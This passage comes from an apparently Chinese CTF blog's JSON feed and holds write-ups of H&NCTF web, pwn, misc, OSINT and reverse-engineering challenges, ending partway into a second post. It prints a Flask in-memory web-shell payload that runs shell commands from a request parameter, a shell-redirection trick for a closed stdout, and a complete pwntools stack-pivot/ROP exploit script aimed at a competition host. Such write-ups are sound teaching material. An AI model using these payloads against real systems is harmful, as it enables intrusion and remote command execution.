id=\"成功情况\"><a class=\"markdownIt-Anchor\" href=\"#成功情况\">#</a> 成功情况：</h3>\n<p>找到了另一个 payload，同样是内存马，payload 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd=app.add_url_rule(<span class=\"string\">&#x27;/test&#x27;</span>,<span class=\"string\">&#x27;test&#x27;</span>,<span class=\"keyword\">lambda</span>:<span class=\"built_in\">__import__</span>(<span class=\"string\">&#x27;os&#x27;</span>).popen(request.args.get(<span class=\"string\">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure>\n<p>之后访问 /test?cmd=cat+/flag 成功出 flag：flag {42ae8a8b-4f88-4c45-a162-bd1881da16ea}。</p>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn:</h1>\n<h2 id=\"close\"><a class=\"markdownIt-Anchor\" href=\"#close\">#</a> close</h2>\n<pre><code>\t逆天题目，纯牛马出题人，想暴打。\n\n\t拿到题目第一件事儿是检查保护，这个题保护也就那样，PIE加NX。\n</code></pre>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared# checksec pwn</span><br><span class=\"line\">[*] &#x27;/mnt/shared/pwn&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<pre><code>\t反编译看看：\n</code></pre>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;**********************************&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*     Welcome to the H&amp;NCTF!     *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;**********************************&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*             *****              *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*            *     *             *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*           *  o o  *            *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*          *    v    *           *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*         *  *     *  *          *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*         * * * * * * *          *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;**********************************&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;*      Do you know close?        *&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;**********************************&quot;</span>);</span><br><span class=\"line\">  close(<span class=\"number\">1</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>\t这题目什么玩意儿？关闭了标准输出流还玩儿毛线？\n\n\t算了，老老实实干就完了。经过长时间查找资料，最后找到了做法。\n</code></pre>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared<span class=\"meta\"># nc hnctf.imxbt.cn 35345</span></span><br><span class=\"line\">ls</span><br><span class=\"line\">ls: write error: Bad file descriptor</span><br><span class=\"line\">exec <span class=\"number\">1</span>&gt;&amp;<span class=\"number\">0</span></span><br><span class=\"line\">cat flag</span><br><span class=\"line\">H-NCTF&#123;<span class=\"number\">8</span>d409dad<span class=\"number\">-4b</span>2f<span class=\"number\">-4687</span><span class=\"number\">-9f</span>17<span class=\"number\">-8b</span>450a76946c&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>\t心中暗暗暴打出题人两分钟泄愤。    (*￣︿￣)\n</code></pre>\n<h2 id=\"ez_pwn复现exp是大佬的有时间自己再写个exp\"><a class=\"markdownIt-Anchor\" href=\"#ez_pwn复现exp是大佬的有时间自己再写个exp\">#</a> ez_pwn（复现，exp 是大佬的，有时间自己再写个 exp）</h2>\n<p>看到这个题，我突然觉得我是个执杖，我还以为是出题人故意搞我心态，结果是我学艺不精的缘故，好吧，我的问题，没看出来，我摊牌了，我是个 XX。<br>\n好吧，老样子，Ubuntu 启动！！！<br>\n还是先查看保护：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared<span class=\"comment\"># checksec pwn</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/shared/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>然后 IDA 反编译，漏洞函数为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vul</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">40</span>]; <span class=\"comment\">// [esp+0h] [ebp-2Ch] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x30</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello, %s\\n&quot;</span>, s);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x30</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello, %s\\n&quot;</span>, s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现了点东西，就是，这里存在一些问题，就是，read 函数读取的数据为 48 字节，但是，经过动态调试得出的缓冲区 s 的大小为 44 字节，好好好，IDA 你又得记大过了。<br>\n之后，第一次不需要溢出，将缓冲区全部写满即可，因为存在 % s 这个格式串配合 printf 函数，所以，能够直接把 rbp 的值给打印出来，所以只需要接收之后，就可以拿到 rbp 的值了，然后，通过动态调试得到的 rbp 的地址与缓冲区 buf 的地址，就可以拿到字符串的地址了。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/274c8e349eb022da9e344e7bc10beaf3.png\" alt=\"Screenshot 2024-05-14 234816.png\"><br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/5b55b3705f40fde32011de08190abef9.png\" alt=\"Screenshot 2024-05-14 234826.png\"><br>\n 接收到了 rbp 的值之后，减去 56 就可以得到字符串的地址了。<br>\n之后则是需要通过栈调用 read 函数，向 bss 段写入 sh;（这里我没弄懂为啥不能直接传 /bin/sh，而是要传 sh; 进去），之后重新调用 main 函数重新运行程序，不过，到了这里之后会出一点问题，那就是，第二次进入 main 之后，栈的布局会发生变化，重新进入 vul 函数之后，里面的指针指向的是 vul 函数内的字符串，而不是之前那个，所以这里需要重新进行一次字符串地址的泄露，之后才能对栈进行布局来调用 system 函数。<br>\n大佬的 exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">is_debug = <span class=\"number\">0</span></span><br><span class=\"line\">IP = <span class=\"string\">&quot;hnctf.yuanshen.life&quot;</span></span><br><span class=\"line\">PORT = <span class=\"number\">33070</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = context.binary = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">connect</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> remote(IP, PORT) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> is_debug <span class=\"keyword\">else</span> process()</span><br><span class=\"line\"></span><br><span class=\"line\">g = <span class=\"keyword\">lambda</span> x: gdb.attach(x)</span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> x: p.send(x)</span><br><span class=\"line\">sl = <span class=\"keyword\">lambda</span> x: p.sendline(x)</span><br><span class=\"line\">sa = <span class=\"keyword\">lambda</span> x, y: p.sendafter(x, y)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class=\"line\">r = <span class=\"keyword\">lambda</span> x=<span class=\"literal\">None</span>: p.recv() <span class=\"keyword\">if</span> x <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">else</span> p.recv(x)</span><br><span class=\"line\">rl = <span class=\"keyword\">lambda</span>: p.recvline()</span><br><span class=\"line\">ru = <span class=\"keyword\">lambda</span> x: p.recvuntil(x)</span><br><span class=\"line\">r_leak_libc_64 = <span class=\"keyword\">lambda</span>: u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">r_leak_libc_32 = <span class=\"keyword\">lambda</span>: u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">p = connect()</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">0x2c</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">ru(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">leak = u32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">buf_addr = leak - (<span class=\"number\">0xfff93748</span> - <span class=\"number\">0xfff93710</span>)</span><br><span class=\"line\">success(<span class=\"string\">f&quot;buf_addr -&gt;<span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">read = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">vuln = <span class=\"number\">0x08048639</span></span><br><span class=\"line\">bss = <span class=\"number\">0x804a000</span></span><br><span class=\"line\">system = <span class=\"number\">0x0804857D</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(read) + p32(vuln) + p32(<span class=\"number\">0</span>) + p32(bss) + p32(<span class=\"number\">0x4</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x2c</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class=\"number\">4</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\"><span class=\"comment\"># g(p)</span></span><br><span class=\"line\">s(<span class=\"string\">b&#x27;sh;\\0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">0x4</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">ru(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">buf_addr = buf_addr</span><br><span class=\"line\">success(<span class=\"built_in\">hex</span>(buf_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">buf_addr = buf_addr - (<span class=\"number\">0xffb45f80</span> - <span class=\"number\">0xffb45f4c</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(system) + p32(bss) + p32(bss)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x2c</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># g(p)</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后得到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">H&amp;NCTF&#123;06b0540d-df19-4b49-9e63-fb7b8b67f8f9&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc:</h1>\n<h2 id=\"mancraft-娱乐题\"><a class=\"markdownIt-Anchor\" href=\"#mancraft-娱乐题\">#</a> ManCraft - 娱乐题:</h2>\n<pre><code>\t一个我的世界的服务器，下载1.20.4版本之后进入服务器，根据提示，先绑定队伍的token，之后迅速发育，然后勾引金甲僵尸，也就是劳大，把它勾引到陷阱里杀死，然后就能够拿到一个key，之后用这个key就能拿到flag。\n</code></pre>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/cf711c6120000fcbd5528f8372572795.png\" alt=\"Screenshot 2024-05-12 155018.png\"><img data-src=\"https://img-blog.csdnimg.cn/img_convert/6bb03b4ea780a0a6b4dc67a0ebe6dd84.png\" alt=\"Screenshot 2024-05-12 155005.png\"></p>\n<h2 id=\"osint复现\"><a class=\"markdownIt-Anchor\" href=\"#osint复现\">#</a> osint（复现）:</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyNC9wbmcvNDA2NTcyMzYvMTcxNTY5NzI1MDA1My1iN2ZkZGE1ZC1kOGFiLTRiMTgtYTc1NS02ZGI1MDBiN2JkZDcucG5nP19sYWtlX2NhcmQ9JTdCJTIyc3JjJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZ3d3cueXVxdWUuY29tJTJGYXR0YWNobWVudHMlMkZ5dXF1ZSUyRjAlMkYyMDI0JTJGcG5nJTJGNDA2NTcyMzYlMkYxNzE1Njk3MjUwMDUzLWI3ZmRkYTVkLWQ4YWItNGIxOC1hNzU1LTZkYjUwMGI3YmRkNy5wbmclMjIlMkMlMjJuYW1lJTIyJTNBJTIyb25pc3QucG5nJTIyJTJDJTIyc2l6ZSUyMiUzQTIwMTk2MDklMkMlMjJleHQlMjIlM0ElMjJwbmclMjIlMkMlMjJzb3VyY2UlMjIlM0ElMjIlMjIlMkMlMjJzdGF0dXMlMjIlM0ElMjJkb25lJTIyJTJDJTIyZG93bmxvYWQlMjIlM0F0cnVlJTJDJTIydGFza0lkJTIyJTNBJTIydWQzNTY4NGExLWRhNmMtNDRkNS1hMTk2LWI1OGM1NTFhMTYwJTIyJTJDJTIydGFza1R5cGUlMjIlM0ElMjJ1cGxvYWQlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyaW1hZ2UlMkZwbmclMjIlMkMlMjJfX3NwYWNpbmclMjIlM0ElMjJib3RoJTIyJTJDJTIybW9kZSUyMiUzQSUyMnRpdGxlJTIyJTJDJTIyaWQlMjIlM0ElMjJ1MDJiMjFiOWMlMjIlMkMlMjJtYXJnaW4lMjIlM0ElN0IlMjJ0b3AlMjIlM0F0cnVlJTJDJTIyYm90dG9tJTIyJTNBdHJ1ZSU3RCUyQyUyMmNhcmQlMjIlM0ElMjJmaWxlJTIyJTdE\">onist.png</span><br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/c34220ecf9f8203e1a39b8eddee930af.png\" alt=\"onist.png\"><br>\n 溯源的题，一张图片，光是图片来看，似乎只有两种可能，起飞或者降落，又因为题目要求我们输入目的地，所以，如果是难度不高的话，这儿应该是目的地。<br>\n检查图片属性，发现这张照片最后依次的修改时间是 4 月 23 日下午 3 点多，这张照片很明显是晚上拍摄的，所以，照例来说，这张图应该是在之前的晚上拍摄的，所以，先从 4 月 22 日晚上到 23 日凌晨的航班来看。<br>\n另外，根据机翼上红色的那个红色的图，在网上找到了应该是海南航空的飞机，且左边数字，有个 22，大概推测注册号是 X-22XX，左边的字母，好像是根据国家不同定的，中国的是 B。<br>\n之后，搜索注册号为 B-22，能够知道有几个：<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/04d6e4cf5081298b258bc0551c176f39.png\" alt=\"Screenshot 2024-05-14 230753.png\"><br>\n 之后，通过搜索 4 月 22 日晚上到 4 月 23 日凌晨那段时间的海南航空的飞机，大致可以得到航班号为 HU7006。<br>\n拿到了航班之后，通过航班和时间搜索，能搜到起始地和目的地，目的地是海口美兰国际机场。<br>\n最后，感觉运气使然，在机场附近遇到个有点眼熟的路的弧度，抱着试一试的想法，把地址写上去，结果正确了：<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/1e47424f573bfa5881e1c1ca5ccdbc13.png\" alt=\"Screenshot 2024-05-14 231654.png\"><br>\n 最后 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">H-NCTF&#123;ae53219d0966&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h1>\n<h2 id=\"最喜欢的逆向题\"><a class=\"markdownIt-Anchor\" href=\"#最喜欢的逆向题\">#</a> 最喜欢的逆向题</h2>\n<p>签到题<br>\n v1=a1 [5]=105<br>\n64 位<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/6aecae5c25ab966f7031681129163ad1.png\" alt=\"image.png\"><br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/9a680c7b9571f95c95e3387981104837.png\" alt=\"image.png\"></p>\n<h2 id=\"imagepng\"><a class=\"markdownIt-Anchor\" href=\"#imagepng\">#</a> <img data-src=\"https://img-blog.csdnimg.cn/img_convert/126e38404d285530ded60d084a24f164.png\" alt=\"image.png\"></h2>\n<h2 id=\"hnwna\"><a class=\"markdownIt-Anchor\" href=\"#hnwna\">#</a> hnwna</h2>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/1e45abae7e7b19ba49bf20024e72dcb7.png\" alt=\"image.png\"><br>\n 一个 CSharp 写的小游戏<br>\n方法一：<br>\n用 ILSPY 打开下面的文件<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/e3cd66f1b87fdd0bf564ea75d5a30156.png\" alt=\"image.png\"><br>\n 搜索找到关键函数了（一开始搜索区域不对，导致找不到关键函数）<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/47014959c6e7273ea815c97eeb7e218c.png\" alt=\"image.png\"></p>\n<p>函数 a 为凯撒，if 判断那里移位为 5<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/1bae176c78c6cdaa6215f186e6a11ef8.png\" alt=\"image.png\"><br>\n 加密</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/6c27a0a6a4f7087be4e37c1833102ae7.png\" alt=\"image.png\"><br>\n 方法二：dnspy，类似于破解</p>\n<h2 id=\"do-you-know-swddwait\"><a class=\"markdownIt-Anchor\" href=\"#do-you-know-swddwait\">#</a> DO YOU KNOW SWDD?（wait）</h2>\n<p>32 位打开 ida，出现 SMC。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/ed5d966cbed038fecbb66e8ec4e749c6.png\" alt=\"image.png\"><br>\n 动态调试<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/e690d825722feb18cba7e78cb45b899c.png\" alt=\"image.png\"><br>\n 在导入表中有 virtualprotect 函数，这里对内存权限进行了修改，大概率是 SMC。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/23f0e00acb661a123f7a56a687cce303.png\" alt=\"image.png\"><br>\n 看 41127B 函数 (断点位置下错了，照着 wp 都能错，服了）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/5c2fffc54e63b92ab40b173a92efc026.png\" alt=\"image.png\"><br>\n 看 4113D9<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/c71af45348c34fc31f3a6dd8a76c1a42.png\" alt=\"image.png\"><br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/1282a4aa673fd5c21742692aaa5e44e1.png\" alt=\"image.png\"><br>\np 然后 f5<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/fadbd50ad886b850ef2f02097879bfc2.png\" alt=\"image.png\"><br>\n 可知是凯撒移位 10 位<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/0c76881393aa4b6938c1c4e751019f5d.png\" alt=\"image.png\"></p>\n<h2 id=\"childmaze\"><a class=\"markdownIt-Anchor\" href=\"#childmaze\">#</a> childmaze</h2>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/6b52a1d3bffc480f56e4e4e9438960f9.png\" alt=\"image.png\"><br>\n 迷宫问题<br>\n方法一：静态分析<br>\n找到关键数据部分（不易找到），交叉引用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = &quot;H&#x27;L@PC&#125;Ci625`hG2]3bZK4&#123;1~&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(s)):</span><br><span class=\"line\">    print(chr(ord(s[i]) ^ (i % 7)), end=&quot;&quot;)</span><br></pre></td></tr></table></figure>\n<p>方法二：调试<br>\n在判断跳转的时候下个断点修改 zf 标识符或者改为 jnz 都能实现直接输出 flag<br>\nemmIDA 版本问题吧，识别不出 rust。。。。</p>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/fe4eec6d.html",
            "url": "http://blog.g01den.top/posts/fe4eec6d.html",
            "title": "【2024】高校网络安全管理运维赛",
            "date_published": "2024-05-06T11:10:34.000Z",
            "content_html": "<p>比赛时间：2024-05-06</p>\n<h2 id=\"re-easyre\"><a class=\"markdownIt-Anchor\" href=\"#re-easyre\">#</a> Re-easyre</h2>\n<p>基本的 base64 换表，用 CyberChef 解密</p>\n<h2 id=\"图片png\"><a class=\"markdownIt-Anchor\" href=\"#图片png\">#</a> <img data-src=\"https://img-blog.csdnimg.cn/img_convert/98e1f9771361bda19e93bee54d1a2e3f.png\" alt=\"图片.png\"></h2>\n<h2 id=\"re-babyre\"><a class=\"markdownIt-Anchor\" href=\"#re-babyre\">#</a> Re-babyre</h2>\n<p>进入主函数，发现输入四次 看一下就知道是大数求解<br>\n (当初写的时候差不多 不知道为什么第四个总是算错…)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">s = Solver()  <span class=\"comment\"># 设置一个解方程的类Solver(必须要设置）</span></span><br><span class=\"line\"></span><br><span class=\"line\">v5=BitVec(<span class=\"string\">&#x27;v5&#x27;</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">v6=BitVec(<span class=\"string\">&#x27;v6&#x27;</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\">v7=BitVec(<span class=\"string\">&#x27;v7&#x27;</span>,<span 